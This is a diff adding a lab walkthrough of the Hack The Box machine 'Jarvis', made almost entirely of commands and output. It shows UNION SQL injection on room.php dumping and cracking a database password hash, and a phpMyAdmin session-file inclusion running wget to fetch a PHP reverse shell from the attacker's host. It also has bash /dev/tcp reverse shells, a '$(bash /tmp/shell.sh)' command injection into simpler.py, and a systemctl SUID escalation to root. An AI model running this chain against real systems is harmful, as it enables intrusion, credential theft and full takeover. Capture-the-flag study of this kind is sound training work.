@@ -1,0 +1,534 @@
+Machine-Name  :  Jarvis
+IP-Address    :  10.129.1.113
+
+Command-Line: sudo nmap -A 10.129.1.113
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-12 08:52 EST
+    Nmap scan report for 10.129.1.113
+    Host is up (0.052s latency).
+    Not shown: 998 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+    | ssh-hostkey:
+    |   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
+    |   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
+    |_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+    | http-cookie-flags:
+    |   /:
+    |     PHPSESSID:
+    |_      httponly flag not set
+    |_http-server-header: Apache/2.4.25 (Debian)
+    |_http-title: Stark Hotel
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=2/12%OT=22%CT=1%CU=36799%PV=Y%DS=2%DC=T%G=Y%TM=6026883
+    OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=8)OPS
+    OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+    OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+    OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+    OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+    OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+    OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+    OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+    OS:=S)
+
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 587/tcp)
+    HOP RTT      ADDRESS
+    1   50.77 ms 10.10.14.1
+    2   51.19 ms 10.129.1.113
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 21.84 seconds
+
+
+
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirb/common.txt -e php,txt,sh -f -t 50 -u http://10.129.1.113
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.1
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt, sh | HTTP method: GET | Threads: 50 | Wordlist size: 23053
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-02-12_09-00-10.log
+
+    Target: http://10.129.1.113/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.1.113/_21-02-12_09-00-10.txt
+
+    [09:00:10] Starting:
+    [09:00:10] 403 -  300B  - /.htaccess.php
+    [09:00:10] 403 -  294B  - /.hta.sh
+    [09:00:10] 403 -  299B  - /.htaccess.sh
+    [09:00:10] 403 -  300B  - /.htpasswd.php
+    [09:00:10] 403 -  300B  - /.htpasswd.txt
+    [09:00:10] 403 -  299B  - /.htpasswd.sh
+    [09:00:10] 403 -  295B  - /.hta.php
+    [09:00:10] 403 -  295B  - /.hta.txt
+    [09:00:10] 403 -  292B  - /.hta/
+    [09:00:17] 301 -  310B  - /css  ->  http://10.129.1.113/css/
+    [09:00:17] 200 -    3KB - /css/
+    [09:00:21] 200 -    1KB - /fonts/
+    [09:00:21] 301 -  312B  - /fonts  ->  http://10.129.1.113/fonts/
+    [09:00:21] 200 -    2KB - /footer.php
+    [09:00:23] 403 -  293B  - /icons/
+    [09:00:23] 301 -  313B  - /images  ->  http://10.129.1.113/images/
+    [09:00:23] 200 -    7KB - /images/
+    [09:00:23] 200 -   23KB - /index.php
+    [09:00:23] 200 -   23KB - /index.php/
+    [09:00:24] 301 -  309B  - /js  ->  http://10.129.1.113/js/
+    [09:00:24] 200 -    3KB - /js/
+    [09:00:27] 200 -    1KB - /nav.php
+    [09:00:29] 301 -  317B  - /phpmyadmin  ->  http://10.129.1.113/phpmyadmin/
+    [09:00:30] 200 -   15KB - /phpmyadmin/
+    [09:00:32] 302 -    3KB - /room.php  ->  index.php
+    [09:00:33] 403 -  300B  - /server-status
+    [09:00:33] 403 -  301B  - /server-status/
+
+    Task Completed
+
+
+Notes: Admin page found: http://10.129.1.113/phpmyadmin/index.php
+
+SQL-Injection: http://10.129.1.113/room.php?cod=9999 union select "1","2",(select user()),"4","5","6","7"
+Result: DBadmin@localhost
+
+SQL-Injection: http://10.129.1.113/room.php?cod=9999 union select "1","2",(select @@version),"4","5","6","7"
+Result: 10.1.37-MariaDB-0+deb9u1
+
+SQL-Injection: http://10.129.1.113/room.php?cod=9999 union select "1","2", (union select group_concat(SCHEMA_NAME, ":") from information_schema.schemata),"4","5","6","7"
+Result:
+hotel:,information_schema:,mysql:,performance_schema:
+
+SQL-Injection: http://10.129.1.113/room.php?cod=9999 union select "1","2", (union select group_concat(TABLE_NAME, ":", COLUMN_NAME) from information_schema.columns),"4","5","6","7"
+Result:
+    room:cod,room:name,
+    room:price,
+    room:descrip,
+    room:star,
+    room:image,
+    room:mini,
+    ALL_PLUGINS:PLUGIN_NAME,
+    ALL_PLUGINS:PLUGIN_VERSION,
+    ALL_PLUGINS:PLUGIN_STATUS,
+    ALL_PLUGINS:PLUGIN_TYPE,
+    ALL_PLUGINS:PLUGIN_TYPE_VERSION,
+    ALL_PLUGINS:PLUGIN_LIBRARY,
+    ALL_PLUGINS:PLUGIN_LIBRARY_VERSION,
+    ALL_PLUGINS:PLUGIN_AUTHOR,
+    ALL_PLUGINS:PLUGIN_DESCRIPTION,
+    ALL_PLUGINS:PLUGIN_LICENSE,
+    ALL_PLUGINS:LOAD_OPTION,
+    ALL_PLUGINS:PLUGIN_MATURITY,
+    ALL_PLUGINS:PLUGIN_AUTH_VERSION,
+    APPLICABLE_ROLES:GRANTEE,
+    APPLICABLE_ROLES:ROLE_NAME,
+    APPLICABLE_ROLES:IS_GRANTABLE,
+    APPLICABLE_ROLES:IS_DEFAULT,
+    CHARACTER_SETS:CHARACTER_SET_NAME,
+    CHARACTER_SETS:DEFAULT_COLLATE_NAME,
+    CHARACTER_SETS:DESCRIPTION,
+    CHARACTER_SETS:MAXLEN,
+    COLLATIONS:COLLATION_NAME,
+    COLLATIONS:CHARACTER_SET_NAME,
+    COLLATIONS:ID,
+    COLLATIONS:IS_DEFAULT,
+    COLLATIONS:IS_COMPILED,
+    COLLATIONS:SORTLEN,
+    COLLATION_CHARACTER_SET_APPLICABILITY:COLLATION_NAME,
+    COLLATION_CHARACTER_SET_APPLICABILITY:CHARACTER_SET_NAME,
+    COLUMNS:TABLE_CATALOG,
+    COLUMNS:TABLE_SCHEMA,
+    COLUMNS:TABLE_NAME,
+    COLUMNS:COLUMN_NAME,
+    COLUMNS:ORDINAL_POSITION,
+    COLUMNS
+
+SQL-Injection: http://10.129.1.113/room.php?cod=9999 union select "1","2", (union select group_concat(TABLE_NAME, ":", COLUMN_NAME) from information_schema.columns where table_schema = "hotel"),"4","5","6","7"
+Result:
+    column_stats:db_name,
+    column_stats:table_name,
+    column_stats:column_name,
+    column_stats:min_value,
+    column_stats:max_value,
+    column_stats:nulls_ratio,
+    column_stats:avg_length,
+    column_stats:avg_frequency,
+    column_stats:hist_size,
+    column_stats:hist_type,
+    column_stats:histogram,
+    columns_priv:Host,
+    columns_priv:Db,
+    columns_priv:User,
+    columns_priv:Table_name,
+    columns_priv:Column_name,
+    columns_priv:Timestamp,
+    columns_priv:Column_priv,
+    db:Host,
+    db:Db,
+    db:User,
+    db:Select_priv,
+    db:Insert_priv,
+    db:Update_priv,
+    db:Delete_priv,
+    db:Create_priv,
+    db:Drop_priv,
+    db:Grant_priv,
+    db:References_priv,
+    db:Index_priv,
+    db:Alter_priv,
+    db:Create_tmp_table_priv,
+    db:Lock_tables_priv,
+    db:Create_view_priv,
+    db:Show_view_priv,
+    db:Create_routine_priv,
+    db:Alter_routine_priv,
+    db:Execute_priv,
+    db:Event_priv,
+    db:Trigger_priv,
+    event:db,
+    event:name,
+    event:body,
+    event:definer,
+    event:execute_at,
+    event:interval_value,
+    event:interval_field,
+    event:created,
+    event:modified,
+    event:last_executed,
+    event:starts,
+    event:ends,
+    event:status,
+    event:on_completion,
+    event:sql_mode,
+    event:comment,
+    event:originator,
+    event:time_zo
+
+
+SQL-SQL-Injection: http://10.129.1.113/room.php?cod=9999 union select "1", "2,", (select group_concat(host,":",user,":",password) from mysql.user),"4","5","6","7"
+Result:
+    localhost:DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+Notes: Password hash collected.
+
+
+SQL-Injection: http://10.129.1.113/room.php?cod=9999 union select "1", "2", "3","4","5",(LOAD_FILE(/var/www/html/room.php)),"7"
+Notes: Looking at the code which handles the SQL-Injection (/room.php).
+Result:
+    query("select * from room where cod=".$_GET['cod']);
+    $line=mysqli_fetch_array($result);
+    $room=new Room();
+    $room->cod=$line['cod'];
+    $room->name=$line['name'];
+    $room->price=$line['price'];
+    $room->star=$line['star'];
+    $room->image=$line['image'];
+    $room->mini=$line['mini'];
+    $room->descrip=$line['descrip'];
+    } else{ header("Location:index.php");
+    } ?> printRoomU();
+    include('footer.php');
+    ?> " class="room image-popup-link" style="background-image: url(/images/query("select * from room where cod=".$_GET['cod']);
+    $line=mysqli_fetch_array($result);
+    $room=new Room();
+    $room->cod=$line['cod'];
+    $room->name=$line['name'];
+    $room->price=$line['price'];
+    $room->star=$line['star'];
+    $room->image=$line['image'];
+    $room->mini=$line['mini'];
+    $room->descrip=$line['descrip'];
+    } else{ header("Location:index.php");
+    } ?> printRoomU();
+    include('footer.php');
+    ?> );
+    ">
+
+Alternative base64 MySQL-Injection: http://10.129.1.113/room.php?cod=9999 union select "1", "2", "3","4","5",(TO_base64(LOAD_FILE(/var/www/html/room.php))),"7"
+
+
+Command-Line: hashcat --example-hashes |grep -i mysql -B1 -A2
+Results:
+    MODE: 200
+    TYPE: MySQL323
+    HASH: 7196759210defdc0
+    PASS: hashcat
+    --
+    MODE: 300
+    TYPE: MySQL4.1/MySQL5
+    HASH: fcf7c1b8749cf99d88e5f34271d636178fb5d130
+    PASS: hashcat
+    --
+    MODE: 7401
+    TYPE: MySQL $A$ (sha256crypt)
+    HASH: $mysql$A$005*F9CC98CE08892924F50A213B6BC571A2C11778C5*625479393559393965414D45316477456B484F41316E64484742577A2E3162785353526B7554584647562F
+    PASS: hashcat
+
+    --
+    MODE: 11200
+    TYPE: MySQL CRAM (SHA1)
+    HASH: $mysqlna$2576670568531371763643101056213751754328*5e4be686a3149a12847caa9898247dcc05739601
+    PASS: hashcat
+
+Notes: MySQL4.1 has the same amount of characters as the hash found (41). Using "-m 300" to crack password.
+
+Command-Line: hashcat -m 300 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 /usr/share/wordlists/rockyou.txt
+Result:
+    hashcat (v6.1.1) starting...
+
+    OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+    =============================================================================================================================
+    * Device #1: pthread-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 29751/29815 MB (8192 MB allocatable), 12MCU
+
+    Minimum password length supported by kernel: 0
+    Maximum password length supported by kernel: 256
+
+    Hashes: 1 digests; 1 unique digests, 1 unique salts
+    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+    Rules: 1
+
+    Applicable optimizers applied:
+    * Zero-Byte
+    * Early-Skip
+    * Not-Salted
+    * Not-Iterated
+    * Single-Hash
+    * Single-Salt
+
+    ATTENTION! Pure (unoptimized) backend kernels selected.
+    Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+    If you want to switch to optimized backend kernels, append -O to your commandline.
+    See the above message to find out about the exact limits.
+
+    Watchdog: Hardware monitoring interface not found on your system.
+    Watchdog: Temperature abort trigger disabled.
+
+    Host memory required for this attack: 67 MB
+
+    Dictionary cache built:
+    * Filename..: /usr/share/wordlists/rockyou.txt
+    * Passwords.: 14344392
+    * Bytes.....: 139921507
+    * Keyspace..: 14344385
+    * Runtime...: 1 sec
+
+    2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou
+
+    Session..........: hashcat
+    Status...........: Cracked
+    Hash.Name........: MySQL4.1/MySQL5
+    Hash.Target......: 2d2b7a5e4e637b8fba1d17f40318f277d29964d0
+    Time.Started.....: Sun Feb 14 05:15:06 2021 (0 secs)
+    Time.Estimated...: Sun Feb 14 05:15:06 2021 (0 secs)
+    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+    Guess.Queue......: 1/1 (100.00%)
+    Speed.#1.........:   221.5 kH/s (0.51ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+    Recovered........: 1/1 (100.00%) Digests
+    Progress.........: 12288/14344385 (0.09%)
+    Rejected.........: 0/12288 (0.00%)
+    Restore.Point....: 0/14344385 (0.00%)
+    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+    Candidates.#1....: 123456 -> hawkeye
+
+    Started: Sun Feb 14 05:14:45 2021
+    Stopped: Sun Feb 14 05:15:07 2021
+
+
+
+Command-Line: hashcat -m 300 --show 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 /usr/share/wordlists/rockyou.txt
+Result:
+    2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou
+
+
+Browser: http://10.129.1.113/phpmyadmin/
+Username: DBadmin
+Password: imissyou
+Result: *** SUCCESSFUL LOGIN ***
+
+Command-Line: cp /php-reverse-shell.php .
+Command-Line: mv /php-reverse-shell.php t.php
+Command-Line: sudo python3 -m http.server --bind 10.10.14.155 80
+Command-Line: nc -lvnp 9001
+
+Notes: In /phpmyadmin. Clicked on SQL.
+SQL-Injection: select "<?php exec('wget -0 /var/www/html/shell.php http://10.10.14.155/t.php')?>"
+
+Browser: http://10.129.1.113/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_s54m757oeclrgbg8e34566cudbkeqj4b
+Result:
+    PMA_token |s:16:"\OTj_4(KMP{4rTb`";browser_access_time|a:1:{s:7:"default";i:1613453670;}relation|a:1:{i:1;a:22:{s:11:"PMA_VERSION";s:5:"4.8.0";s:7:"relwork";b:0;s:11:"displaywork";b:0;s:12:"bookmarkwork";b:0;s:7:"pdfwork";b:0;s:8:"commwork";b:0;s:8:"mimework";b:0;s:11:"historywork";b:0;s:10:"recentwork";b:0;s:12:"favoritework";b:0;s:11:"uiprefswork";b:0;s:12:"trackingwork";b:0;s:14:"userconfigwork";b:0;s:9:"menuswork";b:0;s:7:"navwork";b:0;s:17:"savedsearcheswork";b:0;s:18:"centralcolumnswork";b:0;s:20:"designersettingswork";b:0;s:19:"exporttemplateswork";b:0;s:8:"allworks";b:0;s:4:"user";N;s:2:"db";N;}}cache|a:2:{s:16:"server_1_DBadmin";a:16:{s:14:"mysql_cur_user";s:17:"DBadmin@localhost";s:17:"is_create_db_priv";b:1;s:14:"is_reload_priv";b:1;s:12:"db_to_create";s:0:"";s:30:"dbs_where_create_table_allowed";a:1:{i:0;s:1:"*";}s:11:"dbs_to_test";b:0;s:9:"proc_priv";b:1;s:10:"table_priv";b:1;s:8:"col_priv";b:1;s:7:"db_priv";b:1;s:12:"is_grantuser";b:0;s:13:"is_createuser";b:1;s:12:"is_superuser";b:1;s:11:"binary_logs";a:0:{}s:18:"menu-levels-server";a:13:{s:9:"databases";s:9:"Databases";s:3:"sql";s:3:"SQL";s:6:"status";s:6:"Status";s:6:"rights";s:5:"Users";s:6:"export";s:6:"Export";s:6:"import";s:6:"Import";s:8:"settings";s:8:"Settings";s:6:"binlog";s:10:"Binary log";s:11:"replication";s:11:"Replication";s:4:"vars";s:9:"Variables";s:7:"charset";s:8:"Charsets";s:7:"plugins";s:7:"Plugins";s:6:"engine";s:7:"Engines";}s:19:"profiling_supported";b:1;}s:8:"server_1";a:4:{s:15:"userprefs_mtime";i:1613453559;s:14:"userprefs_type";s:7:"session";s:12:"config_mtime";i:1523112944;s:9:"userprefs";a:1:{s:7:"Console";a:1:{s:4:"Mode";s:8:"collapse";}}}}encryption_key|s:32:"��Ai;�p��{�9�(�d�|�\���c��b�";userconfig|a:2:{s:2:"db";a:1:{s:12:"Console/Mode";s:8:"collapse";}s:2:"ts";i:1613453559;}two_factor_check|b:1;is_git_revision|b:0;tmpval|a:12:{s:15:"favorite_tables";a:1:{i:1;a:0:{}}s:13:"recent_tables";a:1:{i:1;a:0:{}}s:5:"query";a:1:{s:32:"212e54ba09a05b19e6982be7181adad1";a:8:{s:3:"sql";s:83:"select """;s:12:"repeat_cells";i:100;s:8:"max_rows";i:25;s:3:"pos";s:1:"0";s:6:"pftext";s:1:"P";s:18:"relational_display";s:1:"K";s:9:"geoOption";s:4:"GEOM";s:14:"display_binary";b:1;}}s:6:"pftext";s:1:"P";s:18:"relational_display";s:1:"K";s:9:"geoOption";s:4:"GEOM";s:14:"display_binary";b:1;s:12:"display_blob";b:0;s:19:"hide_transformation";b:0;s:3:"pos";s:1:"0";s:8:"max_rows";i:25;s:12:"repeat_cells";i:100;}ConfigFile1|a:2:{s:7:"Console";a:1:{s:4:"Mode";s:8:"collapse";}s:7:"Servers";a:1:{i:1;a:2:{s:7:"only_db";s:0:"";s:7:"hide_db";s:0:"";}}}debug|a:0:{}Import_message|a:2:{s:7:"message";N;s:11:"go_back_url";s:14:"server_sql.php";}is_multi_query|b:0;sql_from_query_box|b:1;sql_history|a:1:{i:0;a:3:{s:2:"db";s:0:"";s:5:"table";s:0:"";s:8:"sqlquery";s:83:"select """;}}errors|a:0:{}
+
+Browser: 10.129.1.113/shell.php
+Result:
+    *** REVERSE SHELL ***
+    www-data
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+Result:
+    www-data@jarvis:/$
+
+
+Command-Line: ctrl+z ... fg ... Enter (2x)
+Result: True shell.
+
+
+www-data@jarvis:/$ cd /home
+www-data@jarvis:/home$ ls -la
+Result:
+    total 12
+    drwxr-xr-x  3 root   root   4096 Mar  2  2019 .
+    drwxr-xr-x 23 root   root   4096 Mar  3  2019 ..
+    drwxr-xr-x  4 pepper pepper 4096 Mar  5  2019 pepper
+Notes: Found user "pepper".
+
+
+www-data@jarvis:/$ nano /tmp/shell.sh
+File-Content:
+    #!/bin/bash
+    bash -i >& /dev/tcp/10.10.14.155/9001 0>&1
+
+
+www-data@jarvis:/home/pepper$ sudo -l
+    sudo -l
+    Matching Defaults entries for www-data on jarvis:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+    User www-data may run the following commands on jarvis:
+        (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+
+        www-data@jarvis:/home/pepper$ su pepper
+        su pepper
+        Password: imissyou
+
+        su: Authentication failure
+
+
+
+Command-Line: nc -lvnp 9001
+
+
+www-data@jarvis:/$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+Result:
+    sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+    ***********************************************
+         _                 _
+     ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
+    / __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+    \__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+    |___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                    |_|               |_|    |___/
+                                    @ironhackers.es
+
+    ***********************************************
+
+
+Enter an IP: $(bash /tmp/shell.sh)
+Result:
+    *** USER ACCESS ***
+    pepper@jarvis:/tmp$
+
+
+pepper@jarvis:/tmp$ cat ~/user.txt
+Result:
+    cat ~/user.txt
+    2afa36c4f05b37b34259c93551f5c44f
+    *** USER OWNED ***
+
+
+
+
+Attempting root access...
+
+
+
+
+Running-Program: linpeas.sh
+Result:
+-rwsr-x--- 1 root pepper     171K Feb 17  2019 /bin/systemctl
+Notes: SUID set for "systemctl"
+
+Browser: GTFObins
+Searched: systemctl/suid
+URL: https://gtfobins.github.io/gtfobins/systemctl/#suid
+Exploit:
+    sudo install -m =xs $(which systemctl) .
+
+    TF=$(mktemp).service
+    echo '[Service]
+    Type=oneshot
+    ExecStart=/bin/sh -c "id > /tmp/output"
+    [Install]
+    WantedBy=multi-user.target' > $TF
+    ./systemctl link $TF
+    ./systemctl enable --now $TF
+
+
+Notes: Skipping the 'sudo' part of the exploit...
+
+
+
+pepper@jarvis:/tmp$ TF=$(mktemp).service
+Result:
+    /tmp/tmp.dwAZYY6wbM.service
+
+
+pepper@jarvis:/tmp$ echo '[Service]
+                          Type=oneshot
+                          ExecStart=/tmp/tmp.dwAZYY6wbM.service
+                          [Install]
+                          WantedBy=multi-user.target' > $TF
+
+File-Contents-For: /tmp/tmp.dwAZYY6wbM.service
+Contents:
+    [Unit]
+    Description=shell
+    [Service]
+    Type=oneshot
+    ExecStart=/tmp/tmp.dwAZYY6wbM.service
+    [Install]
+    WantedBy=multi-user.target
+
+
+Notes: The program would not work in the /tmp directory, so the files were copied to /home/pepper/
+
+
+pepper@jarvis:/tmp$ cp tmp.dwAZYY6wbM.service ~
+pepper@jarvis:/tmp$ cp shell.sh ~
+pepper@jarvis:/tmp$ cd
+pepper@jarvis:~$ nano tmp.dwAZYY6wbM.service
+Result:
+[Unit]
+    Description=shell
+
+    [Service]
+    Type=oneshot
+    ExecStart=/home/pepper/shell.sh
+    [Install]
+    WantedBy=multi-user.target
+
+pepper@jarvis:~$ nano shell.sh
+Result:
+    #!/bin/bash
+    bash -i >& /dev/tcp/10.10.14.155/9002 0>&1
+
+pepper@jarvis:~$ cp tmp.dwAZYY6wbM.service pw1.service
+pepper@jarvis:~$ systemctl link /home/pepper/pw1.service
+Result:
+    Created symlink /etc/systemd/system/pw1.service -> /home/pepper/pw1.service.
+Command-Line: nc -lvnp 9002
+pepper@jarvis:~$ systemctl enable --now /home/pepper/pw1.service
+Result:
+    *** ROOT ACCESS ***
+    root@jarvis:/home/pepper#
+
+root@jarvis:/home/pepper# cat /root/root.txt
+Result: d41d8cd98f00b204e9800998ecf84271
+    *** ROOT OWNED ***
+
+
+      *** FINISHED ***
